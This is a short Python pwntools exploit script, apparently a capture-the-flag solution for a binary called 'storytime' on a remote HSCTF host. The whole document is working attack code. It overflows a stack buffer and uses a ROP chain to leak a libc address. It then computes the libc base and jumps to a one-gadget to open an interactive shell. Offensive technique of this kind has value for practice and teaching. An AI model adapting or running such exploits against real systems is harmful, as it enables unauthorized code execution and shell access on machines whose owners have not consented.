from pwn import *
#io=process("./storytime",env={"LD_PRELOAD":"./libc-2.27.so"})
#gdb.attach(io)
io=remote("pwn.hsctf.com",3333)
firstret=0x00000000004006fa
rbx=0xc0203
rbp=0xc0204
rdi=1
rsi=0x0000000000600ff0
rdx=8
secondret=0x00000000004006e0
thirdret=0x000000000040062e
payload="a"*56+p64(firstret)+p64(rbx)+p64(rbp)+p64(0)+p64(rdi)+p64(rsi)+p64(rdx)+p64(secondret)+p64(0x601058)*7+p64(thirdret)
io.recvuntil("story:")
io.sendline(payload)
leak=io.recvuntil("H")
leak=leak[2:-3]
leak=leak+"\x00\x00"
print len(leak)
leak=u64(leak)
print hex(leak)
base=leak-0x020740
system=base+0x4f2c5
io.recvuntil("story:")
payload2="a"*56+p64(system)
io.sendline(payload2)
io.interactive()
